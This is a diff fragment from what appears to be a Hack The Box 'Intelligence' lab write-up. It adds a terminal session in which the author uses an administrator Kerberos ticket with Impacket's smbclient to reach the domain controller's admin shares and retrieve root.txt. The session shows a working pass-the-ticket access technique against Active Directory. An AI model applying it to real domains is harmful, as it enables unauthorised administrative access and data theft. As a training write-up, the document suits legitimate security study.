@@ -681,3 +681,35 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 ┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
 └─# export KRB5CCNAME=`pwd`/administrator.ccache
 ```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
+└─# python3 smbclient.py intelligence.htb/administrator@dc.intelligence.htb -no-pass -k                         127 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Type help for list of commands
+# whoami
+*** Unknown syntax: whoami
+# who
+host:    \\10.10.14.8, user: administrator, active:     9, idle:     1
+# pwd
+
+# shares
+ADMIN$
+C$
+IPC$
+IT
+NETLOGON
+SYSVOL
+Users
+# shares
+ADMIN$
+C$
+IPC$
+IT
+NETLOGON
+SYSVOL
+Users
+# use Users
+# get administrator\desktop\root.txt
+```
